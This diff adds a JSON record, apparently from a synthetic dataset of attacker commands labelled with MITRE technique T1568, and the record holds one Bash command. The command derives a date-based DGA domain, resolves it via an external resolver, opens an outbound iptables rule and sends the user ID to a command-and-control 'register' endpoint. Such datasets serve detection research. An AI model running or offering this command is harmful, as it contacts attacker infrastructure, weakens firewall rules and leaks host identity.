@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "SEED=\"delta\"; LABEL=$(echo -n \"${SEED}$(date -u +%Y%m%d)\" | md5sum | cut -c1-12); FQDN=\"${LABEL}.cdn-metrics.org\"; PORT=2053; IP=$(host -t A \"$FQDN\" 1.1.1.1 | awk '/has address/ {print $4}' | shuf -n1); iptables -A OUTPUT -p tcp --dport ${PORT} -j ACCEPT; [ -n \"$IP\" ] && curl -sSf --connect-to \"${FQDN}:${PORT}:${IP}:${PORT}\" \"https://${FQDN}:${PORT}/register?u=$(id -u)\"",
+  "explanation": "Resolves a DGA domain using a specific external resolver to obtain a fast-flux IP, then directs curl to that IP with --connect-to while preserving the Host SNI.",
+  "rationale_steps": [
+    "Derive DGA domain from seed and date",
+    "Query external resolver for A records",
+    "Randomly select a returned IP",
+    "Establish C2 over port 2053 bound to that IP"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-a41625fd",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
